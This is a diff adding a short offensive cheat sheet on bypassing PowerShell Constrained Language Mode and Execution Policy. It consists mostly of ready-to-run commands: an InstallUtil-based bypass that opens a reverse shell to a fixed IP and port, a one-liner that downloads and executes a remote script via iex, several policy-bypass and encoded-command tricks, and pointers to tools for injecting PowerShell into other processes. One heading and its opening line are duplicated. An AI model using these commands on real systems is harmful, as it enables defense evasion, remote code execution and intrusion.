@@ -1,0 +1,57 @@
+PS Constrained Language Mode
+PowerShell Constrained Language Mode locks down many of the features needed to use PowerShell effectively, such as blocking COM objects, only allowing approved .NET types, XAML-based workflows, PowerShell classes, and more.
+
+Check
+$ExecutionContext.SessionState.LanguageMode
+#Values could be: FullLanguage or ConstrainedLanguage
+
+Bypass
+#Easy bypass
+Powershell -version 2
+
+In current Windows that Bypass won't work but you can use PSByPassCLM (https://github.com/padovah4ck/PSByPassCLM)
+To compile it you may need to Add a Reference -> Browse ->Browse -> add C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll and change the project to .Net4.5.
+
+Direct bypass:
+bash
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
+
+Reverse shell:
+bash
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
+
+You can use ReflectivePick (https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 
+or SharpPick (https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)
+to execute Powershell code in any process and bypass the constrained mode. 
+For more info check: https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode.
+
+
+PS Execution Policy
+
+By default it is set to restricted. Main ways to bypass this policy:
+powershell
+PS Execution Policy
+
+By default it is set to restricted. Main ways to bypass this policy:
+powershell
+
+
+#Read en Exec
+Get-Content .runme.ps1 | PowerShell.exe -noprofile -
+#Read and Exec
+Get-Content .runme.ps1 | Invoke-Expression
+#Use other execution policy
+PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
+#Change users execution policy
+Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
+#Change execution policy for this session
+Set-ExecutionPolicy Bypass -Scope Process
+#Download and execute:
+powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
+#Use command switch
+Powershell -command "Write-Host 'My voice is my passport, verify me.'"
+#Use EncodeCommand
+$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
+
+MORE INFO: 
+https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/
